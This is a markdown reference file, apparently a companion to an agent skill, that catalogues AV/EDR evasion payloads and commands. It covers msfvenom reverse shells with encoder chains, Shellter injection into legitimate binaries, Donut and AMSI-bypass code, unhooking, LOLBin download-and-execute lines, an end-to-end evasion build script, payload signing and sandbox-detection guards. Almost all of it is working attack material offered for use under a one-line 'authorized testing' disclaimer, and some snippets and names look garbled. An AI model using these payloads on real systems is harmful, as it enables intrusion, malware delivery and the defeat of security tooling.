# AV/EDR Evasion Payloads

> This file is a companion to `SKILL.md`, containing categorized evasion payloads, tool commands, and technique references. All commands are for authorized security testing only.

---

## 1. msfvenom Payload Generation

### Basic Payload Generation

```bash
# Windows x64 reverse TCP shell (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# Windows x64 reverse TCP shell (stageless)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# Windows x86 reverse HTTP shell
msfvenom -p windows/meterpreter/reverse_http LHOST=10.0.0.1 LPORT=8080 -f exe -o payload.exe

# Linux x64 reverse TCP shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload.elf

# PowerShell reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-reflection -o payload.ps1

# Raw shellcode (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin

# C# format for inline execution
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f csharp -o shellcode.cs
```

### Single Encoder Payloads

```bash
# shikata_ga_nai encoding (most popular polymorphic XOR encoder)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor_dynamic -i 3 -f exe -o encoded.exe

# x86 shikata_ga_nai with 5 iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# alpha_mixed encoder (alphanumeric output)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/alpha_mixed -f exe -o alpha.exe

# XOR encoder with custom key
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor -i 3 -f raw -o xor_encoded.bin
```

### Multi-Encoder Chains

```bash
# Chain multiple encoders for layered obfuscation
# Stage 1: shikata_ga_nai -> Stage 2: xor_dynamic -> Stage 3: shikata_ga_nai
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  --encoder-stage x86/xor_dynamic \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o chained.exe

# Manual chaining: encode, then re-encode the output
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f raw -o stage1.bin
msfvenom -p generic/custom PAYLOADFILE=stage1.bin \
  -e x64/shikata_ga_nai -i 3 -f exe -o stage2.exe
```

### Format Options for Delivery

```bash
# DLL format for side-loading or service installation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f dll -o evil.dll

# MSI format for deployment via msiexec
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f msi -o install.msi

# HTA format for web delivery
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.0.0.1 LPORT=8080 \
  -f hta-psh -o evil.hta

# VBA macro for document embedding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f vba-psh -o macro.txt

# PowerShell inline
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f ps1 -o payload.ps1

# Python format
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f raw -o payload.py
```

---

## 2. Shellter PE Injection

### Automatic Mode

```bash
# Launch shellter in automatic mode
shellter -a --file /path/to/legitimate.exe

# Interactive prompts in automatic mode:
# 1. Select payload: LHOST, LPORT
# 2. Shellter injects shellcode into the PE while preserving functionality
# 3. Output: legitimate.exe with embedded shellcode

# Specify payload directly
shellter -a --file putty.exe \
  --payload windows/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444

# Common legitimate binaries to inject:
# - Sysinternals tools (Procmon, Autoruns)
# - Windows utilities (notepad, calc)
# - Legitimate signed software installers
```

### Manual Mode (Advanced)

```bash
# Launch shellter in manual mode for custom shellcode
shellter -m --file /path/to/target.exe

# Manual mode allows:
# - Custom shellcode injection (provide raw shellcode file)
# - Selection of injection point within PE sections
# - Control over PE header modifications
# - Stealth vs. functionality trade-offs

# Generate custom shellcode first
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f raw -o custom_shellcode.bin

# Then inject via shellter manual mode
shellter -m --file target.exe --custom-shellcode custom_shellcode.bin
```

### Verification

```bash
# Verify the injected binary still runs
wine injected.exe 2>&1 | head -5

# Check binary entropy (high entropy may trigger heuristic detection)
# Install ent: apt install ent
ent injected.exe

# Test against local AV (on a Windows VM with Defender)
# Copy injected.exe to test VM and execute
# Monitor: Windows Defender detection, EDR alerts
```

---

## 3. Veil Evasion Framework

### Setup and Configuration

```bash
# Install Veil
apt install veil
veil --setup

# Or manual clone
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./config/update-config.py --force
./Veil.py

# List available evasion payloads
veil -t Evasion --list payloads

# List available encoders
veil -t Evasion --list encoders
```

### Payload Generation

```bash
# Generate PowerShell payload with embedded shellcode
veil -t Evasion -p 1 \
  --msfvenom windows/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444 \
  -o powershell_evasion

# Generate C# payload
veil -t Evasion -p 2 \
  --msfvenom windows/x64/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444 \
  -o csharp_evasion

# Generate Python payload
veil -t Evasion -p 3 \
  --msfvenom windows/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444 \
  -o python_evasion

# Generate Go payload
veil -t Evasion -p 4 \
  --msfvenom windows/x64/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444 \
  -o go_evasion

# Generate with specific encoder
veil -t Evasion -p 1 \
  --msfvenom windows/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444 \
  --encoder 1 -o encoded_payload
```

### Veil Payload Types

```
Payload Number  | Language    | Description
1               | PowerShell  | Shellcode injection via PowerShell
2               | C#          | Shellcode injection via C# executable
3               | Python      | Shellcode injection via Python
4               | Go          | Shellcode injection via Go
5               | Ruby        | Shellcode injection via Ruby
6               | Perl        | Shellcode injection via Perl
7               | C           | Shellcode injection via C
8               | PowerShell  | Meterpreter stager via PowerShell
9               | PowerShell  | Custom shellcode via PowerShell
```

---

## 4. Donut - .NET Assembly Shellcode Generation

### Basic Usage

```bash
# Convert .NET assembly to shellcode
donut -i Rubeus.exe -o rubeus.bin

# Convert with parameters
donut -i Seatbelt.exe -p "--group=all" -o seatbelt.bin

# Specify output as PE executable
donut -i Rubeus.exe -p "kerberoast" -f 2 -o rubeus.exe

# Specify architecture (x64)
donut -i tool.exe -a 2 -o tool_x64.bin

# Specify architecture (x86)
donut -i tool.exe -a 1 -o tool_x86.bin

# Generate with custom entry point
donut -i CustomTool.exe -c "Namespace.Class" -m "MethodName" -o custom.bin
```

### Advanced Options

```bash
# Bypass AMSI (enabled by default in donut)
donut -i Rubeus.exe -o rubeus.bin -b 1

# Bypass WDAC (Windows Defender Application Control)
donut -i Rubeus.exe -o rubeus.bin -b 2

# Bypass both AMSI and WDAC
donut -i Rubeus.exe -o rubeus.bin -b 3

# Use HTTP staging (host the assembly on a web server)
donut -i LargeTool.exe -o loader.bin \
  --classporig "http://10.0.0.1/LargeTool.exe"

# Specify runtime version
donut -i tool.exe -r 4.0 -o tool_v4.bin

# Verbose output for debugging
donut -i Rubeus.exe -p "dump" -o rubeus.bin -v 1
```

### Donut Python Module

```python
# Use donut as a Python module for automation
from donut import Donut

# Generate shellcode from .NET assembly
shellcode = Donut(
    file="Rubeus.exe",
    params="kerberoast",
    arch=2,          # x64
    bypass=3         # AMSI + WDAC bypass
).create()

with open("rubeus.bin", "wb") as f:
    f.write(shellcode)
```

---

## 5. pe2shc - PE to Shellcode Conversion

### Basic Usage

```bash
# Convert PE executable to shellcode
pe2shc mimikatz.exe mimikatz.bin

# Convert with entry point specification
pe2shc tool.exe tool.bin

# Convert and verify
pe2shc payload.exe payload.bin
# Output: [+] PE to shellcode conversion successful
#         [+] Entry point: 0x1234
#         [+] Image base: 0x400000
```

### Using Converted Shellcode

```bash
# Load shellcode via a loader (example loader.exe)
# loader.exe reads shellcode.bin and executes in memory
loader.exe payload.bin

# Inject shellcode into remote process
# (requires a separate injection tool or custom code)
injector.exe target_pid payload.bin

# Common tools to use pe2shc output with:
# - Custom reflective loaders
# - Cobalt Strike execute-assembly alternative
# - Process injection frameworks
```

### Batch Conversion

```bash
# Convert multiple PE files to shellcode
for exe in /opt/tools/*.exe; do
  name=$(basename "$exe" .exe)
  pe2shc "$exe" "/opt/shellcode/${name}.bin"
  echo "Converted: $exe -> /opt/shellcode/${name}.bin"
done
```

---

## 6. Hyperion - PE Encryption

### Basic Usage

```bash
# Encrypt a PE file with AES-128
hyperion payload.exe encrypted.exe

# Specify output file
hyperion -i input.exe -o output.exe

# Verify the encrypted file runs
# (test on an isolated Windows VM)
# encrypted.exe decrypts itself in memory at runtime
```

### Hyperion with msfvenom Integration

```bash
# Step 1: Generate base payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 -f exe -o base.exe

# Step 2: Apply encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor_dynamic -i 3 -f exe -o encoded.exe

# Step 3: Encrypt with hyperion
hyperion encoded.exe final.exe

# Result: encoded + encrypted payload with two evasion layers
```

---

## 7. AMSI Bypass Techniques

### PowerShell AMSI Bypass (Memory Patching)

```powershell
# AMSI bypass via memory patching (force AMSI_INIT_FAILED)
# This sets the first byte of AmsiScanBuffer to make it return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative: patch AmsiScanBuffer directly
[Byte[]]$patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[IntPtr]$amsiScanAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    ([Int64]([System.Runtime.InteropServices.Marshal]::ReadIntPtr(
        [Int64]([System.Runtime.InteropServices.Marshal]::ReadIntPtr(
            [Int64]([System.Runtime.InteropServices.Marshal]::ReadIntPtr(
                [IntPtr]::Add([System.Diagnostics.Process]::GetCurrentProcess().Modules[0].BaseAddress, 0x00011028), 0
            ).ToInt64() + 0x08), 0
        ).ToInt64() + 0x48), 0
    )) -as [Type]
).Method.MethodHandle.GetFunctionPointer()
```

### C# AMSI Bypass

```csharp
// AMSI bypass via COM interface manipulation
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)0x10, 0x40, out oldProtect);
        // Patch: mov eax, 0x80070057 (E_INVALIDARG -> scan returns clean)
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)0x10, oldProtect, out oldProtect);
    }
}
```

---

## 8. Direct Syscall Techniques

### Syscall Stub Generation

```bash
# Install SysWhispers (Python tool for generating syscall stubs)
pip3 install syswhispers3

# Generate syscall stubs for common NTAPI functions
syswhispers3 --functions NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls

# Output: syscalls.h, syscalls.c (C header and implementation)
# These stubs make direct syscalls without going through ntdll.dll hooks
```

### Direct Syscall Pattern (Assembly)

```nasm
; Direct syscall stub example for NtAllocateVirtualMemory
; Resolves SSN (System Service Number) at runtime
mov r10, rcx            ; Standard Windows x64 calling convention
mov eax, SSN_HERE       ; System Service Number (resolved dynamically)
syscall                 ; Direct kernel transition (bypasses ntdll hooks)
ret
```

### API Unhooking

```bash
# Unhook ntdll.dll by loading a fresh copy from disk
# This restores original function bytes, removing EDR hooks

# Method 1: PowerShell unhooking script
# Reads clean ntdll from C:\Windows\System32\ntdll.dll on disk
# Maps it over the currently loaded (hooked) ntdll in memory

# Method 2: C# unhooking
# 1. Get handle to ntdll.dll in current process
# 2. Read clean copy from C:\Windows\System32\ntdll.dll
# 3. Find .text section in both copies
# 4. Overwrite hooked .text with clean .text
# 5. Restore original memory protections
```

---

## 9. LOLBin (Living Off the Land Binaries)

### Common LOLBin Execution Patterns

```bash
# certutil.exe - download and decode payload
certutil -urlcache -split -f http://10.0.0.1/payload.exe payload.exe
certutil -decode payload.b64 payload.exe

# mshta.exe - execute HTA payload
mshta http://10.0.0.1/evil.hta

# msiexec.exe - execute MSI payload
msiexec /i http://10.0.0.1/payload.msi /quiet

# wscript.exe / cscript.exe - execute VBS/JS payloads
wscript //nologo payload.vbs
cscript //nologo payload.js

# rundll32.exe - execute DLL exports
rundll32.exe payload.dll,EntryPoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"

# cmstp.exe - execute INF-based payloads
cmstp /s /ns payload.inf

# regsvr32.exe - execute COM-based payloads
regsvr32 /s /n /u /i:http://10.0.0.1/payload.sct scrobj.dll

# msbuild.exe - execute C# project files
msbuild.exe payload.csproj
```

### Process Injection via LOLBins

```powershell
# PowerShell: Inject shellcode into legitimate process
# Uses VirtualAlloc, Copy, and CreateThread for local injection
$code = [System.Convert]::FromBase64String("<BASE64_SHELLCODE>")
$size = $code.Length
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $mem, $size)
$thread = [System.Threading.Thread]::new([System.Threading.ThreadStart]{
    param($addr) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $addr, [Func[int]])
}.GetFunctionPointer())
$thread.Start()
```

---

## 10. Sleep Obfuscation

### Memory Encryption During Sleep

```bash
# Sleep obfuscation pattern:
# 1. Encrypt all payload data in memory
# 2. Legitimize memory protections
# 3. Sleep for beacon interval
# 4. Decrypt payload data
# 5. Execute tasks
# 6. Repeat

# This defeats memory scanners that periodically scan process memory
# for injected code patterns while the beacon is sleeping
```

### Ekko Sleep Obfuscation

```bash
# Ekko uses CreateTimerQueueTimer to suspend the current thread
# and encrypt the .text section during sleep
# When the timer fires, the thread resumes and decrypts itself

# Tools implementing sleep obfuscation:
# - Cobalt Strike (sleep mask)
# - Mythic (various agents)
# - Brute Ratel (sleep obfuscation built-in)
# - Havoc (sleep obfuscation built-in)
```

---

## 11. Payload Testing Methodology

### Local Testing (Windows VM)

```powershell
# Check Windows Defender status
Get-MpComputerStatus
Get-MpPreference

# Test payload (with real-time protection enabled)
# 1. Copy payload to test VM
# 2. Monitor Defender: Get-MpThreatDetection
# 3. Check Event Log: Microsoft-Windows-Windows Defender/Operational

# Test with Defender disabled (for comparison)
Set-MpPreference -DisableRealtimeMonitoring $true
# Execute payload
# Re-enable
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Sandbox Testing

```bash
# any.run - interactive sandbox (use "no distribution" option)
# Upload payload and observe behavior

# Hybrid Analysis (Payload Security)
# Submit via API:
curl -X POST "https://www.hybrid-analysis.com/api/v2/submit/file" \
  -H "api-key: YOUR_KEY" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@payload.exe" \
  -F "environment_id=120"  # Windows 10 64-bit

# VirusTotal (WARNING: shares with vendors!)
# Only use for post-engagement reporting, not during active engagements
# VT Enterprise accounts have "no-distribution" option

# Alternative no-distribution services:
# -masturbator.com (manual AV scan)
# - virusbay.co
# - AntarMalwall
```

---

## 12. Complete Evasion Chain Example

### Full Build Pipeline

```bash
#!/bin/bash
# Complete evasion chain: generate -> encode -> encrypt -> test

LHOST="10.0.0.1"
LPORT="4444"
OUTPUT_DIR="/tmp/evaded_payload"

mkdir -p "$OUTPUT_DIR"

echo "[1/6] Generating base payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f exe -o "$OUTPUT_DIR/base.exe"

echo "[2/6] Applying multi-encoder chain..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -e x64/xor_dynamic -i 5 \
  -f exe -o "$OUTPUT_DIR/encoded.exe"

echo "[3/6] Encrypting with hyperion..."
hyperion "$OUTPUT_DIR/encoded.exe" "$OUTPUT_DIR/encrypted.exe"

echo "[4/6] Injecting into legitimate binary..."
# Use shellter to inject into a legitimate signed binary
cp /usr/share/windows-binaries/putty.exe "$OUTPUT_DIR/putty_injected.exe"
shellter -a --file "$OUTPUT_DIR/putty_injected.exe" \
  --payload windows/x64/meterpreter/reverse_tcp \
  --lhost $LHOST --lport $LPORT

echo "[5/6] Generating .NET assembly shellcode..."
donut -i "$OUTPUT_DIR/encrypted.exe" -a 2 -b 3 -o "$OUTPUT_DIR/loader.bin"

echo "[6/6] Build complete. Files:"
ls -la "$OUTPUT_DIR/"
echo ""
echo "Test each file against target AV/EDR before deployment."
echo "Use local VM or no-distribution sandbox for testing."
```

---

## 13. Evasion Effectiveness Quick Reference

| Technique | Defeats | Defeated By | Layer |
|-----------|---------|-------------|-------|
| shikata_ga_nai (1-3 iterations) | Basic signature matching | Modern heuristic + entropy checks | Static |
| Multi-encoder chain (5+ iterations) | Signature + some heuristic | Behavioral monitoring | Static |
| Hyperion AES encryption | Signature matching | Sandbox analysis, entropy heuristics | Static |
| Shellter PE injection | Signature + heuristic | Behavioral API monitoring | Static + Heuristic |
| Veil framework payloads | Signature matching | Updated AV definitions | Static |
| Donut shellcode generation | File-based detection | Memory scanning, ETW | In-Memory |
| pe2shc conversion | File-based detection | Memory scanning | In-Memory |
| AMSI bypass | Script content scanning | EDR memory scanning | Runtime |
| Direct syscalls | API hooking (user-mode) | Kernel-level callbacks | Behavioral |
| API unhooking | EDR user-mode hooks | ETW, kernel telemetry | Behavioral |
| LOLBin execution | File-based + some behavioral | Parent-child process analysis | Execution |
| Sleep obfuscation | Periodic memory scanning | ETW + memory scanning correlation | Persistence |

---

## 14. Process Injection Techniques

### DLL Injection

```bash
# Generate DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o inject.dll

# Inject DLL into a running process using PowerShell
# Requires admin or appropriate privileges
powershell -nop -c "
\$code = [System.IO.File]::ReadAllBytes('C:\Temp\inject.dll')
[System.Reflection.Assembly]::Load(\$code)
"
```

### Process Hollowing

```bash
# Create a suspended legitimate process
# then replace its memory with malicious code
# Tools: Process Hollowing POC, custom C# implementation

# Example using HollowsHunter (detection tool)
hollows_hunter.exe /dir C:\Windows\System32
# Scans for hollowed processes on the target system
```

### Reflective DLL Injection

```bash
# Use Invoke-ReflectivePEInjection from PowerSploit
powershell -nop -c "
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEPath C:\Temp\payload.dll -ProcName explorer
"

# Generate position-independent shellcode for injection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin
```

---

## 15. Payload Signing and Authenticode Manipulation

### Code Signing Certificate Abuse

```bash
# Check if a binary is signed
signtool verify /pa /all payload.exe

# Extract signature information
osslsigncode verify -in signed.exe

# Remove signature from signed binary (for re-signing)
osslsigncode remove-signature -in signed.exe -out unsigned.exe

# Sign with self-signed certificate (for testing)
openssl req -newkey rsa:2048 -nodes -keyout test.key -x509 -days 365 -out test.crt
osslsigncode sign -certs test.crt -key test.key -in payload.exe -out signed_payload.exe
```

### Authenticode Hash Verification

```bash
# Get authenticode hash of a binary
osslsigncode extract-signature -in signed.exe -out signature.der

# Verify the authenticode hash matches
powershell -nop -c "Get-AuthenticodeSignature payload.exe | Format-List *"
```

---

## 16. Environment Keying and Payload Guarding

### Domain-Based Execution Guard

```powershell
# Only execute if joined to the target domain
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if ($domain -eq "target.local") {
    IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')
} else {
    Write-Host "Domain mismatch. Exiting."
}
```

### IP Address Check Before Execution

```bash
# Only execute if the target IP matches expected range
python3 -c "
import socket
ip = socket.gethostbyname(socket.gethostname())
if ip.startswith('192.168.1.'):
    import os
    os.system('/bin/bash')
else:
    print('IP mismatch. Exiting.')
"
```

### Sandbox Detection and Anti-Analysis

```powershell
# Check for common sandbox indicators
$sandbox_indicators = @(
    "vbox",
    "vmware",
    "virtual",
    "sandbox",
    "malware",
    "sample",
    "virus"
)

$computerName = $env:COMPUTERNAME.ToLower()
$username = $env:USERNAME.ToLower()

foreach ($indicator in $sandbox_indicators) {
    if ($computerName.Contains($indicator) -or $username.Contains($indicator)) {
        Write-Host "Clean exit."
        exit
    }
}

# Check uptime (sandboxes often have very low uptime)
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$diff = (Get-Date) - $uptime
if ($diff.TotalMinutes -lt 10) {
    Write-Host "Clean exit."
    exit
}
```
